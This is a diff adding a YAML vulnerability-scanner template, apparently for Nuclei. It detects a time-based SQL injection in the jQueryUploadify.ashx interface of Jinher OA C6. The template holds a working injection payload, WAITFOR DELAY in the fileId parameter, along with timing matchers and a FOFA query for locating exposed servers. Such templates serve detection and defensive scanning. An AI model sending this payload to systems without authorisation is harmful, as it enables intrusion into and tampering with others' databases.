@@ -1,0 +1,36 @@
+id: jinher-oa-c6-jQueryUploadify-sqli
+info:
+  name: 金和 OA C6 jQueryUploadify.ashx - sqli
+  author: leadlife
+  severity: high
+  description: 金和OA-C6系统接口jQueryUploadify.ashx存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3jQueryUploadify.ashx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: 2024,sqli,time,jinher,oa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        type=delete&fileId=-99';WAITFOR+DELAY'0:0:6'--
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(header,'text/plain')
+          - contains(body,'0')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
